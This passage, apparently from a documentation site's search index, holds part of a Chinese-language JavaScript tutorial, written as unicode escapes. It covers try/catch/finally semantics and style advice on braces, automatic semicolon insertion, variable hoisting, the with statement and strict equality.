'\u51fa\u9519\u4e86\uff01' ; } catch ( e ) { console . log ( '\u6355\u6349\u5230\u5185\u90e8\u9519\u8bef' ); throw e ; // \u8fd9\u53e5\u539f\u672c\u4f1a\u7b49\u5230finally\u7ed3\u675f\u518d\u6267\u884c } finally { return false ; // \u76f4\u63a5\u8fd4\u56de } } try { f (); } catch ( e ) { // \u6b64\u5904\u4e0d\u4f1a\u6267\u884c console . log ( 'caught outer \"bogus\"' ); } // \u6355\u6349\u5230\u5185\u90e8\u9519\u8bef \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8fdb\u5165 catch \u4ee3\u7801\u5757\u4e4b\u540e\uff0c\u4e00\u9047\u5230 throw \u8bed\u53e5\uff0c\u5c31\u4f1a\u53bb\u6267\u884c finally \u4ee3\u7801\u5757\uff0c\u5176\u4e2d\u6709 return false \u8bed\u53e5\uff0c\u56e0\u6b64\u5c31\u76f4\u63a5\u8fd4\u56de\u4e86\uff0c\u4e0d\u518d\u4f1a\u56de\u53bb\u6267\u884c catch \u4ee3\u7801\u5757\u5269\u4e0b\u7684\u90e8\u5206\u4e86\u3002 try \u4ee3\u7801\u5757\u5185\u90e8\uff0c\u8fd8\u53ef\u4ee5\u518d\u4f7f\u7528 try \u4ee3\u7801\u5757\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 try { try { consle . log ( 'Hello world!' ); // \u62a5\u9519 } finally { console . log ( 'Finally' ); } console . log ( 'Will I run?' ); } catch ( error ) { console . error ( error . message ); } // Finally // consle is not defined \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c try \u91cc\u9762\u8fd8\u6709\u4e00\u4e2a try \u3002\u5185\u5c42\u7684 try \u62a5\u9519\uff08 console \u62fc\u9519\u4e86\uff09\uff0c\u8fd9\u65f6\u4f1a\u6267\u884c\u5185\u5c42\u7684 finally \u4ee3\u7801\u5757\uff0c\u7136\u540e\u629b\u51fa\u9519\u8bef\uff0c\u88ab\u5916\u5c42\u7684 catch \u6355\u83b7\u3002","title":"finally \u4ee3\u7801\u5757"},{"location":"features/error/#_5","text":"Jani Hartikainen, JavaScript Errors and How to Fix Them","title":"\u53c2\u8003\u8fde\u63a5"},{"location":"features/style/","text":"\u7f16\u7a0b\u98ce\u683c \u00b6 \u6982\u8ff0 \u00b6 \u201c\u7f16\u7a0b\u98ce\u683c\u201d\uff08programming style\uff09\u6307\u7684\u662f\u7f16\u5199\u4ee3\u7801\u7684\u6837\u5f0f\u89c4\u5219\u3002\u4e0d\u540c\u7684\u7a0b\u5e8f\u5458\uff0c\u5f80\u5f80\u6709\u4e0d\u540c\u7684\u7f16\u7a0b\u98ce\u683c\u3002 \u6709\u4eba\u8bf4\uff0c\u7f16\u8bd1\u5668\u7684\u89c4\u8303\u53eb\u505a\u201c\u8bed\u6cd5\u89c4\u5219\u201d\uff08grammar\uff09\uff0c\u8fd9\u662f\u7a0b\u5e8f\u5458\u5fc5\u987b\u9075\u5b88\u7684\uff1b\u800c\u7f16\u8bd1\u5668\u5ffd\u7565\u7684\u90e8\u5206\uff0c\u5c31\u53eb\u201c\u7f16\u7a0b\u98ce\u683c\u201d\uff08programming style\uff09\uff0c\u8fd9\u662f\u7a0b\u5e8f\u5458\u53ef\u4ee5\u81ea\u7531\u9009\u62e9\u7684\u3002\u8fd9\u79cd\u8bf4\u6cd5\u4e0d\u5b8c\u5168\u6b63\u786e\uff0c\u7a0b\u5e8f\u5458\u56fa\u7136\u53ef\u4ee5\u81ea\u7531\u9009\u62e9\u7f16\u7a0b\u98ce\u683c\uff0c\u4f46\u662f\u597d\u7684\u7f16\u7a0b\u98ce\u683c\u6709\u52a9\u4e8e\u5199\u51fa\u8d28\u91cf\u66f4\u9ad8\u3001\u9519\u8bef\u66f4\u5c11\u3001\u66f4\u6613\u4e8e\u7ef4\u62a4\u7684\u7a0b\u5e8f\u3002 \u6240\u4ee5\uff0c\u7f16\u7a0b\u98ce\u683c\u7684\u9009\u62e9\u4e0d\u5e94\u8be5\u57fa\u4e8e\u4e2a\u4eba\u7231\u597d\u3001\u719f\u6089\u7a0b\u5ea6\u3001\u6253\u5b57\u91cf\u7b49\u56e0\u7d20\uff0c\u800c\u8981\u8003\u8651\u5982\u4f55\u5c3d\u91cf\u4f7f\u4ee3\u7801\u6e05\u6670\u6613\u8bfb\u3001\u51cf\u5c11\u51fa\u9519\u3002\u4f60\u9009\u62e9\u7684\uff0c\u4e0d\u662f\u4f60\u559c\u6b22\u7684\u98ce\u683c\uff0c\u800c\u662f\u4e00\u79cd\u80fd\u591f\u6e05\u6670\u8868\u8fbe\u4f60\u7684\u610f\u56fe\u7684\u98ce\u683c\u3002\u8fd9\u4e00\u70b9\uff0c\u5bf9\u4e8e JavaScript \u8fd9\u79cd\u8bed\u6cd5\u81ea\u7531\u5ea6\u5f88\u9ad8\u7684\u8bed\u8a00\u5c24\u5176\u91cd\u8981\u3002 \u5fc5\u987b\u7262\u8bb0\u7684\u4e00\u70b9\u662f\uff0c\u5982\u679c\u4f60\u9009\u5b9a\u4e86\u4e00\u79cd\u201c\u7f16\u7a0b\u98ce\u683c\u201d\uff0c\u5c31\u5e94\u8be5\u575a\u6301\u9075\u5b88\uff0c\u5207\u5fcc\u591a\u79cd\u98ce\u683c\u6df7\u7528\u3002\u5982\u679c\u4f60\u52a0\u5165\u4ed6\u4eba\u7684\u9879\u76ee\uff0c\u5c31\u5e94\u8be5\u9075\u5b88\u73b0\u6709\u7684\u98ce\u683c\u3002 \u7f29\u8fdb \u00b6 \u884c\u9996\u7684\u7a7a\u683c\u548c Tab \u952e\uff0c\u90fd\u53ef\u4ee5\u4ea7\u751f\u4ee3\u7801\u7f29\u8fdb\u6548\u679c\uff08indent\uff09\u3002 Tab \u952e\u53ef\u4ee5\u8282\u7701\u51fb\u952e\u6b21\u6570\uff0c\u4f46\u4e0d\u540c\u7684\u6587\u672c\u7f16\u8f91\u5668\u5bf9 Tab \u7684\u663e\u793a\u4e0d\u5c3d\u76f8\u540c\uff0c\u6709\u7684\u663e\u793a\u56db\u4e2a\u7a7a\u683c\uff0c\u6709\u7684\u663e\u793a\u4e24\u4e2a\u7a7a\u683c\uff0c\u6240\u4ee5\u6709\u4eba\u89c9\u5f97\uff0c\u7a7a\u683c\u952e\u53ef\u4ee5\u4f7f\u5f97\u663e\u793a\u6548\u679c\u66f4\u7edf\u4e00\u3002 \u65e0\u8bba\u4f60\u9009\u62e9\u54ea\u4e00\u79cd\u65b9\u6cd5\uff0c\u90fd\u662f\u53ef\u4ee5\u63a5\u53d7\u7684\uff0c\u8981\u505a\u7684\u5c31\u662f\u59cb\u7ec8\u575a\u6301\u8fd9\u4e00\u79cd\u9009\u62e9\u3002\u4e0d\u8981\u4e00\u4f1a\u4f7f\u7528 Tab \u952e\uff0c\u4e00\u4f1a\u4f7f\u7528\u7a7a\u683c\u952e\u3002 \u533a\u5757 \u00b6 \u5982\u679c\u5faa\u73af\u548c\u5224\u65ad\u7684\u4ee3\u7801\u4f53\u53ea\u6709\u4e00\u884c\uff0cJavaScript \u5141\u8bb8\u8be5\u533a\u5757\uff08block\uff09\u7701\u7565\u5927\u62ec\u53f7\u3002 1 2 3 if ( a ) b (); c (); \u4e0a\u9762\u4ee3\u7801\u7684\u539f\u610f\u53ef\u80fd\u662f\u4e0b\u9762\u8fd9\u6837\u3002 1 2 3 4 if ( a ) { b (); c (); } \u4f46\u662f\uff0c\u5b9e\u9645\u6548\u679c\u5374\u662f\u4e0b\u9762\u8fd9\u6837\u3002 1 2 3 4 if ( a ) { b (); } c (); \u56e0\u6b64\uff0c\u5efa\u8bae\u603b\u662f\u4f7f\u7528\u5927\u62ec\u53f7\u8868\u793a\u533a\u5757\u3002 \u53e6\u5916\uff0c\u533a\u5757\u8d77\u9996\u7684\u5927\u62ec\u53f7\u7684\u4f4d\u7f6e\uff0c\u6709\u8bb8\u591a\u4e0d\u540c\u7684\u5199\u6cd5\u3002\u6700\u6d41\u884c\u7684\u6709\u4e24\u79cd\uff0c\u4e00\u79cd\u662f\u8d77\u9996\u7684\u5927\u62ec\u53f7\u53e6\u8d77\u4e00\u884c\u3002 1 2 3 4 block { // ... } \u53e6\u4e00\u79cd\u662f\u8d77\u9996\u7684\u5927\u62ec\u53f7\u8ddf\u5728\u5173\u952e\u5b57\u7684\u540e\u9762\u3002 1 2 3 block { // ... } \u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u4e24\u79cd\u5199\u6cd5\u90fd\u53ef\u4ee5\u63a5\u53d7\u3002\u4f46\u662f\uff0cJavaScript \u8981\u4f7f\u7528\u540e\u4e00\u79cd\uff0c\u56e0\u4e3a JavaScript \u4f1a\u81ea\u52a8\u6dfb\u52a0\u53e5\u672b\u7684\u5206\u53f7\uff0c\u5bfc\u81f4\u4e00\u4e9b\u96be\u4ee5\u5bdf\u89c9\u7684\u9519\u8bef\u3002 1 2 3 4 5 6 7 8 9 10 return { key : value }; // \u76f8\u5f53\u4e8e return ; { key : value }; \u4e0a\u9762\u7684\u4ee3\u7801\u7684\u539f\u610f\uff0c\u662f\u8981\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u4f46\u5b9e\u9645\u4e0a\u8fd4\u56de\u7684\u662f undefined \uff0c\u56e0\u4e3a JavaScript \u81ea\u52a8\u5728 return \u8bed\u53e5\u540e\u9762\u6dfb\u52a0\u4e86\u5206\u53f7\u3002\u4e3a\u4e86\u907f\u514d\u8fd9\u4e00\u7c7b\u9519\u8bef\uff0c\u9700\u8981\u5199\u6210\u4e0b\u9762\u8fd9\u6837\u3002 1 2 3 return { key : value }; \u56e0\u6b64\uff0c\u8868\u793a\u533a\u5757\u8d77\u9996\u7684\u5927\u62ec\u53f7\uff0c\u4e0d\u8981\u53e6\u8d77\u4e00\u884c\u3002 \u5706\u62ec\u53f7 \u00b6 \u5706\u62ec\u53f7\uff08parentheses\uff09\u5728 JavaScript \u4e2d\u6709\u4e24\u79cd\u4f5c\u7528\uff0c\u4e00\u79cd\u8868\u793a\u51fd\u6570\u7684\u8c03\u7528\uff0c\u53e6\u4e00\u79cd\u8868\u793a\u8868\u8fbe\u5f0f\u7684\u7ec4\u5408\uff08grouping\uff09\u3002 1 2 3 4 5 // \u5706\u62ec\u53f7\u8868\u793a\u51fd\u6570\u7684\u8c03\u7528 console . log ( 'abc' ); // \u5706\u62ec\u53f7\u8868\u793a\u8868\u8fbe\u5f0f\u7684\u7ec4\u5408 ( 1 + 2 ) * 3 \u5efa\u8bae\u53ef\u4ee5\u7528\u7a7a\u683c\uff0c\u533a\u5206\u8fd9\u4e24\u79cd\u4e0d\u540c\u7684\u62ec\u53f7\u3002 \u8868\u793a\u51fd\u6570\u8c03\u7528\u65f6\uff0c\u51fd\u6570\u540d\u4e0e\u5de6\u62ec\u53f7\u4e4b\u95f4\u6ca1\u6709\u7a7a\u683c\u3002 \u8868\u793a\u51fd\u6570\u5b9a\u4e49\u65f6\uff0c\u51fd\u6570\u540d\u4e0e\u5de6\u62ec\u53f7\u4e4b\u95f4\u6ca1\u6709\u7a7a\u683c\u3002 \u5176\u4ed6\u60c5\u51b5\u65f6\uff0c\u524d\u9762\u4f4d\u7f6e\u7684\u8bed\u6cd5\u5143\u7d20\u4e0e\u5de6\u62ec\u53f7\u4e4b\u95f4\uff0c\u90fd\u6709\u4e00\u4e2a\u7a7a\u683c\u3002 \u6309\u7167\u4e0a\u9762\u7684\u89c4\u5219\uff0c\u4e0b\u9762\u7684\u5199\u6cd5\u90fd\u662f\u4e0d\u89c4\u8303\u7684\u3002 1 2 3 4 5 foo ( bar ) return ( a + b ); if ( a === 0 ) {...} function foo ( b ) {...} function ( x ) {...} \u4e0a\u9762\u4ee3\u7801\u7684\u6700\u540e\u4e00\u884c\u662f\u4e00\u4e2a\u533f\u540d\u51fd\u6570\uff0c function \u662f\u8bed\u6cd5\u5173\u952e\u5b57\uff0c\u4e0d\u662f\u51fd\u6570\u540d\uff0c\u6240\u4ee5\u4e0e\u5de6\u62ec\u53f7\u4e4b\u95f4\u5e94\u8be5\u8981\u6709\u4e00\u4e2a\u7a7a\u683c\u3002 \u884c\u5c3e\u7684\u5206\u53f7 \u00b6 \u5206\u53f7\u8868\u793a\u4e00\u6761\u8bed\u53e5\u7684\u7ed3\u675f\u3002JavaScript \u5141\u8bb8\u7701\u7565\u884c\u5c3e\u7684\u5206\u53f7\u3002\u4e8b\u5b9e\u4e0a\uff0c\u786e\u5b9e\u6709\u4e00\u4e9b\u5f00\u53d1\u8005\u884c\u5c3e\u4ece\u6765\u4e0d\u5199\u5206\u53f7\u3002\u4f46\u662f\uff0c\u7531\u4e8e\u4e0b\u9762\u8981\u8ba8\u8bba\u7684\u539f\u56e0\uff0c\u5efa\u8bae\u8fd8\u662f\u4e0d\u8981\u7701\u7565\u8fd9\u4e2a\u5206\u53f7\u3002 \u4e0d\u4f7f\u7528\u5206\u53f7\u7684\u60c5\u51b5 \u00b6 \u9996\u5148\uff0c\u4ee5\u4e0b\u4e09\u79cd\u60c5\u51b5\uff0c\u8bed\u6cd5\u89c4\u5b9a\u672c\u6765\u5c31\u4e0d\u9700\u8981\u5728\u7ed3\u5c3e\u6dfb\u52a0\u5206\u53f7\u3002 \uff081\uff09for \u548c while \u5faa\u73af 1 2 3 4 5 for ( ; ; ) { } // \u6ca1\u6709\u5206\u53f7 while ( true ) { } // \u6ca1\u6709\u5206\u53f7 \u6ce8\u610f\uff0c do...while \u5faa\u73af\u662f\u6709\u5206\u53f7\u7684\u3002 1 2 3 do { a -- ; } while ( a > 0 ); // \u5206\u53f7\u4e0d\u80fd\u7701\u7565 \uff082\uff09\u5206\u652f\u8bed\u53e5\uff1aif\uff0cswitch\uff0ctry 1 2 3 4 5 6 7 8 9 if ( true ) { } // \u6ca1\u6709\u5206\u53f7 switch () { } // \u6ca1\u6709\u5206\u53f7 try { } catch { } // \u6ca1\u6709\u5206\u53f7 \uff083\uff09\u51fd\u6570\u7684\u58f0\u660e\u8bed\u53e5 1 2 function f () { } // \u6ca1\u6709\u5206\u53f7 \u6ce8\u610f\uff0c\u51fd\u6570\u8868\u8fbe\u5f0f\u4ecd\u7136\u8981\u4f7f\u7528\u5206\u53f7\u3002 1 2 var f = function f () { }; \u4ee5\u4e0a\u4e09\u79cd\u60c5\u51b5\uff0c\u5982\u679c\u4f7f\u7528\u4e86\u5206\u53f7\uff0c\u5e76\u4e0d\u4f1a\u51fa\u9519\u3002\u56e0\u4e3a\uff0c\u89e3\u91ca\u5f15\u64ce\u4f1a\u628a\u8fd9\u4e2a\u5206\u53f7\u89e3\u91ca\u4e3a\u7a7a\u8bed\u53e5\u3002 \u5206\u53f7\u7684\u81ea\u52a8\u6dfb\u52a0 \u00b6 \u9664\u4e86\u4e0a\u4e00\u8282\u7684\u4e09\u79cd\u60c5\u51b5\uff0c\u6240\u6709\u8bed\u53e5\u90fd\u5e94\u8be5\u4f7f\u7528\u5206\u53f7\u3002\u4f46\u662f\uff0c\u5982\u679c\u6ca1\u6709\u4f7f\u7528\u5206\u53f7\uff0c\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0cJavaScript \u4f1a\u81ea\u52a8\u6dfb\u52a0\u3002 1 2 3 var a = 1 // \u7b49\u540c\u4e8e var a = 1 ; \u8fd9\u79cd\u8bed\u6cd5\u7279\u6027\u88ab\u79f0\u4e3a\u201c\u5206\u53f7\u7684\u81ea\u52a8\u6dfb\u52a0\u201d\uff08Automatic Semicolon Insertion\uff0c\u7b80\u79f0 ASI\uff09\u3002 \u56e0\u6b64\uff0c\u6709\u4eba\u63d0\u5021\u7701\u7565\u53e5\u5c3e\u7684\u5206\u53f7\u3002\u9ebb\u70e6\u7684\u662f\uff0c\u5982\u679c\u4e0b\u4e00\u884c\u7684\u5f00\u59cb\u53ef\u4ee5\u4e0e\u672c\u884c\u7684\u7ed3\u5c3e\u8fde\u5728\u4e00\u8d77\u89e3\u91ca\uff0cJavaScript \u5c31\u4e0d\u4f1a\u81ea\u52a8\u6dfb\u52a0\u5206\u53f7\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // \u7b49\u540c\u4e8e var a = 3 var a = 3 // \u7b49\u540c\u4e8e 'abc'.length 'abc' . length // \u7b49\u540c\u4e8e return a + b; return a + b ; // \u7b49\u540c\u4e8e obj.foo(arg1, arg2); obj . foo ( arg1 , arg2 ); // \u7b49\u540c\u4e8e 3 * 2 + 10 * (27 / 6) 3 * 2 + 10 * ( 27 / 6 ) \u4e0a\u9762\u4ee3\u7801\u90fd\u4f1a\u591a\u884c\u653e\u5728\u4e00\u8d77\u89e3\u91ca\uff0c\u4e0d\u4f1a\u6bcf\u4e00\u884c\u81ea\u52a8\u6dfb\u52a0\u5206\u53f7\u3002\u8fd9\u4e9b\u4f8b\u5b50\u8fd8\u662f\u6bd4\u8f83\u5bb9\u6613\u770b\u51fa\u6765\u7684\uff0c\u4f46\u662f\u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50\u5c31\u4e0d\u90a3\u4e48\u5bb9\u6613\u770b\u51fa\u6765\u4e86\u3002 1 2 3 4 5 6 7 x = y ( function () { // ... })(); // \u7b49\u540c\u4e8e x = y ( function () {...})(); \u4e0b\u9762\u662f\u66f4\u591a\u4e0d\u4f1a\u81ea\u52a8\u6dfb\u52a0\u5206\u53f7\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 // \u5f15\u64ce\u89e3\u91ca\u4e3a c(d+e) var a = b + c ( d + e ). toString (); // \u5f15\u64ce\u89e3\u91ca\u4e3a a = b/hi/g.exec(c).map(d) // \u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u659c\u6760\uff0c\u4f1a\u5f53\u4f5c\u9664\u6cd5\u8fd0\u7b97\u7b26 a = b /hi/g . exec ( c ). map ( d ); // \u89e3\u91ca\u4e3a'b'['red', 'green']\uff0c // \u5373\u628a\u5b57\u7b26\u4e32\u5f53\u4f5c\u4e00\u4e2a\u6570\u7ec4\uff0c\u6309\u7d22\u5f15\u53d6\u503c var a = 'b' [ 'red' , 'green' ]. forEach ( function ( c ) { console . log ( c ); }) // \u89e3\u91ca\u4e3a function (x) { return x }(a++) // \u5373\u8c03\u7528\u533f\u540d\u51fd\u6570\uff0c\u7ed3\u679cf\u7b49\u4e8e0 var a = 0 ; var f = function ( x ) { return x } ( a ++ ) \u53ea\u6709\u4e0b\u4e00\u884c\u7684\u5f00\u59cb\u4e0e\u672c\u884c\u7684\u7ed3\u5c3e\uff0c\u65e0\u6cd5\u653e\u5728\u4e00\u8d77\u89e3\u91ca\uff0cJavaScript \u5f15\u64ce\u624d\u4f1a\u81ea\u52a8\u6dfb\u52a0\u5206\u53f7\u3002 1 2 3 4 5 6 7 if ( a < 0 ) a = 0 console . log ( a ) // \u7b49\u540c\u4e8e\u4e0b\u9762\u7684\u4ee3\u7801\uff0c // \u56e0\u4e3a 0console \u6ca1\u6709\u610f\u4e49 if ( a < 0 ) a = 0 ; console . log ( a ) \u53e6\u5916\uff0c\u5982\u679c\u4e00\u884c\u7684\u8d77\u9996\u662f\u201c\u81ea\u589e\u201d\uff08 ++ \uff09\u6216\u201c\u81ea\u51cf\u201d\uff08 -- \uff09\u8fd0\u7b97\u7b26\uff0c\u5219\u5b83\u4eec\u7684\u524d\u9762\u4f1a\u81ea\u52a8\u6dfb\u52a0\u5206\u53f7\u3002 1 2 3 4 5 6 7 8 9 10 a = b = c = 1 a ++ b -- c console . log ( a , b , c ) // 1 2 0 \u4e0a\u9762\u4ee3\u7801\u4e4b\u6240\u4ee5\u4f1a\u5f97\u5230 1 2 0 \u7684\u7ed3\u679c\uff0c\u539f\u56e0\u662f\u81ea\u589e\u548c\u81ea\u51cf\u8fd0\u7b97\u7b26\u524d\uff0c\u81ea\u52a8\u52a0\u4e0a\u4e86\u5206\u53f7\u3002\u4e0a\u9762\u7684\u4ee3\u7801\u5b9e\u9645\u4e0a\u7b49\u540c\u4e8e\u4e0b\u9762\u7684\u5f62\u5f0f\u3002 1 2 3 4 a = b = c = 1 ; a ; ++ b ; -- c ; \u5982\u679c continue \u3001 break \u3001 return \u548c throw \u8fd9\u56db\u4e2a\u8bed\u53e5\u540e\u9762\uff0c\u76f4\u63a5\u8ddf\u6362\u884c\u7b26\uff0c\u5219\u4f1a\u81ea\u52a8\u6dfb\u52a0\u5206\u53f7\u3002\u8fd9\u610f\u5473\u7740\uff0c\u5982\u679c return \u8bed\u53e5\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u5bf9\u8c61\u7684\u5b57\u9762\u91cf\uff0c\u8d77\u9996\u7684\u5927\u62ec\u53f7\u4e00\u5b9a\u8981\u5199\u5728\u540c\u4e00\u884c\uff0c\u5426\u5219\u5f97\u4e0d\u5230\u9884\u671f\u7ed3\u679c\u3002 1 2 3 4 5 6 return { first : 'Jane' }; // \u89e3\u91ca\u6210 return ; { first : 'Jane' }; \u7531\u4e8e\u89e3\u91ca\u5f15\u64ce\u81ea\u52a8\u6dfb\u52a0\u5206\u53f7\u7684\u884c\u4e3a\u96be\u4ee5\u9884\u6d4b\uff0c\u56e0\u6b64\u7f16\u5199\u4ee3\u7801\u7684\u65f6\u5019\u4e0d\u5e94\u8be5\u7701\u7565\u884c\u5c3e\u7684\u5206\u53f7\u3002 \u4e0d\u5e94\u8be5\u7701\u7565\u7ed3\u5c3e\u7684\u5206\u53f7\uff0c\u8fd8\u6709\u4e00\u4e2a\u539f\u56e0\u3002\u6709\u4e9b JavaScript \u4ee3\u7801\u538b\u7f29\u5668\uff08uglifier\uff09\u4e0d\u4f1a\u81ea\u52a8\u6dfb\u52a0\u5206\u53f7\uff0c\u56e0\u6b64\u9047\u5230\u6ca1\u6709\u5206\u53f7\u7684\u7ed3\u5c3e\uff0c\u5c31\u4f1a\u8ba9\u4ee3\u7801\u4fdd\u6301\u539f\u72b6\uff0c\u800c\u4e0d\u662f\u538b\u7f29\u6210\u4e00\u884c\uff0c\u4f7f\u5f97\u538b\u7f29\u65e0\u6cd5\u5f97\u5230\u6700\u4f18\u7684\u7ed3\u679c\u3002 \u53e6\u5916\uff0c\u4e0d\u5199\u7ed3\u5c3e\u7684\u5206\u53f7\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u811a\u672c\u5408\u5e76\u51fa\u9519\u3002\u6240\u4ee5\uff0c\u6709\u7684\u4ee3\u7801\u5e93\u5728\u7b2c\u4e00\u884c\u8bed\u53e5\u5f00\u59cb\u524d\uff0c\u4f1a\u52a0\u4e0a\u4e00\u4e2a\u5206\u53f7\u3002 1 2 ; var a = 1 ; // ... \u4e0a\u9762\u8fd9\u79cd\u5199\u6cd5\u5c31\u53ef\u4ee5\u907f\u514d\u4e0e\u5176\u4ed6\u811a\u672c\u5408\u5e76\u65f6\uff0c\u6392\u5728\u524d\u9762\u7684\u811a\u672c\u6700\u540e\u4e00\u884c\u8bed\u53e5\u6ca1\u6709\u5206\u53f7\uff0c\u5bfc\u81f4\u8fd0\u884c\u51fa\u9519\u7684\u95ee\u9898\u3002 \u5168\u5c40\u53d8\u91cf \u00b6 JavaScript \u6700\u5927\u7684\u8bed\u6cd5\u7f3a\u70b9\uff0c\u53ef\u80fd\u5c31\u662f\u5168\u5c40\u53d8\u91cf\u5bf9\u4e8e\u4efb\u4f55\u4e00\u4e2a\u4ee3\u7801\u5757\uff0c\u90fd\u662f\u53ef\u8bfb\u53ef\u5199\u3002\u8fd9\u5bf9\u4ee3\u7801\u7684\u6a21\u5757\u5316\u548c\u91cd\u590d\u4f7f\u7528\uff0c\u975e\u5e38\u4e0d\u5229\u3002 \u56e0\u6b64\uff0c\u5efa\u8bae\u907f\u514d\u4f7f\u7528\u5168\u5c40\u53d8\u91cf\u3002\u5982\u679c\u4e0d\u5f97\u4e0d\u4f7f\u7528\uff0c\u53ef\u4ee5\u8003\u8651\u7528\u5927\u5199\u5b57\u6bcd\u8868\u793a\u53d8\u91cf\u540d\uff0c\u8fd9\u6837\u66f4\u5bb9\u6613\u770b\u51fa\u8fd9\u662f\u5168\u5c40\u53d8\u91cf\uff0c\u6bd4\u5982 UPPER_CASE \u3002 \u53d8\u91cf\u58f0\u660e \u00b6 JavaScript \u4f1a\u81ea\u52a8\u5c06\u53d8\u91cf\u58f0\u660e\u201c\u63d0\u5347\u201d\uff08hoist\uff09\u5230\u4ee3\u7801\u5757\uff08block\uff09\u7684\u5934\u90e8\u3002 1 2 3 4 5 6 7 8 9 if ( ! x ) { var x = {}; } // \u7b49\u540c\u4e8e var x ; if ( ! x ) { x = {}; } \u8fd9\u610f\u5473\u7740\uff0c\u53d8\u91cf x \u662f if \u4ee3\u7801\u5757\u4e4b\u524d\u5c31\u5b58\u5728\u4e86\u3002\u4e3a\u4e86\u907f\u514d\u53ef\u80fd\u51fa\u73b0\u7684\u95ee\u9898\uff0c\u6700\u597d\u628a\u53d8\u91cf\u58f0\u660e\u90fd\u653e\u5728\u4ee3\u7801\u5757\u7684\u5934\u90e8\u3002 1 2 3 4 5 6 7 8 9 for ( var i = 0 ; i < 10 ; i ++ ) { // ... } // \u5199\u6210 var i ; for ( i = 0 ; i < 10 ; i ++ ) { // ... } \u4e0a\u9762\u8fd9\u6837\u7684\u5199\u6cd5\uff0c\u5c31\u5bb9\u6613\u770b\u51fa\u5b58\u5728\u4e00\u4e2a\u5168\u5c40\u7684\u5faa\u73af\u53d8\u91cf i \u3002 \u53e6\u5916\uff0c\u6240\u6709\u51fd\u6570\u90fd\u5e94\u8be5\u5728\u4f7f\u7528\u4e4b\u524d\u5b9a\u4e49\u3002\u51fd\u6570\u5185\u90e8\u7684\u53d8\u91cf\u58f0\u660e\uff0c\u90fd\u5e94\u8be5\u653e\u5728\u51fd\u6570\u7684\u5934\u90e8\u3002 with \u8bed\u53e5 \u00b6 with \u53ef\u4ee5\u51cf\u5c11\u4ee3\u7801\u7684\u4e66\u5199\uff0c\u4f46\u662f\u4f1a\u9020\u6210\u6df7\u6dc6\u3002 1 2 3 with ( o ) { \u3000 foo = bar ; } \u4e0a\u9762\u7684\u4ee3\u7801\uff0c\u53ef\u4ee5\u6709\u56db\u79cd\u8fd0\u884c\u7ed3\u679c\uff1a 1 2 3 4 o . foo = bar ; o . foo = o . bar ; foo = bar ; foo = o . bar ; \u8fd9\u56db\u79cd\u7ed3\u679c\u90fd\u53ef\u80fd\u53d1\u751f\uff0c\u53d6\u51b3\u4e8e\u4e0d\u540c\u7684\u53d8\u91cf\u662f\u5426\u6709\u5b9a\u4e49\u3002\u56e0\u6b64\uff0c\u4e0d\u8981\u4f7f\u7528 with \u8bed\u53e5\u3002 \u76f8\u7b49\u548c\u4e25\u683c\u76f8\u7b49 \u00b6 JavaScript \u6709\u4e24\u4e2a\u8868\u793a\u76f8\u7b49\u7684\u8fd0\u7b97\u7b26\uff1a\u201c\u76f8\u7b49\u201d\uff08 == \uff09\u548c\u201c\u4e25\u683c\u76f8\u7b49\u201d\uff08 === \uff09\u3002 \u76f8\u7b49\u8fd0\u7b97\u7b26\u4f1a\u81ea\u52a8\u8f6c\u6362\u53d8\u91cf\u7c7b\u578b\uff0c\u9020\u6210\u5f88\u591a\u610f\u60f3\u4e0d\u5230\u7684\u60c5\u51b5\u3002 1 2 3 4 5 6 7 0 == '' // true 1 == true // true 2 == true // false 0 == '0' // true false == 'false' // false false == '0' // true ' \\t\\r\\n ' == 0 // true \u56e0\u6b64\uff0c\u5efa\u8bae\u4e0d\u8981\u4f7f\u7528\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 == \uff09\uff0c\u53ea\u4f7f\u7528\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 === \uff09\u3002 \u8bed\u53e5\u7684\u5408\u5e76 \u00b6 \u6709\u4e9b\u7a0b\u5e8f\u5458\u8ffd\u6c42\u7b80\u6d01\uff0c\u559c\u6b22\u5408\u5e76\u4e0d\u540c\u76ee\u7684\u7684\u8bed\u53e5\u3002\u6bd4\u5982\uff0c\u539f\u6765\u7684\u8bed\u53e5\u662f 1 2 3 4 a = b ; if ( a ) { // ... } \u4ed6\u559c\u6b22\u5199\u6210\u4e0b\u9762\u8fd9\u6837\u3002 1 2 3 if ( a = b ) { // ... } \u867d\u7136\u8bed\u53e5\u5c11\u4e86\u4e00\u884c\uff0c\u4f46\u662f\u53ef\u8bfb\u6027\u5927\u6253\u6298\u6263\uff0c\u800c\u4e14\u4f1a\u9020\u6210\u8bef\u8bfb\uff0c\u8ba9\u522b\u4eba\u8bef\u89e3\u8fd9\u884c\u4ee3\u7801\u7684\u610f\u601d\u662f\u4e0b\u9762\u8fd9\u6837\u3002 1 2 3 if \uff08 a === b \uff09 { // ... } \u5efa\u8bae\u4e0d\u8981\u5c06\u4e0d\u540c\u76ee\u7684\u7684\u8bed\u53e5\uff0c\u5408\u5e76\u6210\u4e00\u884c\u3002 \u81ea\u589e\u548c\u81ea\u51cf\u8fd0\u7b97\u7b26 \u00b6 \u81ea\u589e\uff08 ++ \uff09\u548c\u81ea\u51cf\uff08 -- \uff09\u8fd0\u7b97\u7b26\uff0c\u653e\u5728\u53d8\u91cf\u7684\u524d\u9762\u6216\u540e\u9762\uff0c\u8fd4\u56de\u7684\u503c\u4e0d\u4e00\u6837\uff0c\u5f88\u5bb9\u6613\u53d1\u751f\u9519\u8bef\u3002\u4e8b\u5b9e\u4e0a\uff0c\u6240\u6709\u7684 ++ \u8fd0\u7b97\u7b26\u90fd\u53ef\u4ee5\u7528 += 1 \u4ee3\u66ff\u3002 1 2 3 ++ x // \u7b49\u540c\u4e8e x += 1 ; \u6539\u7528 += 1 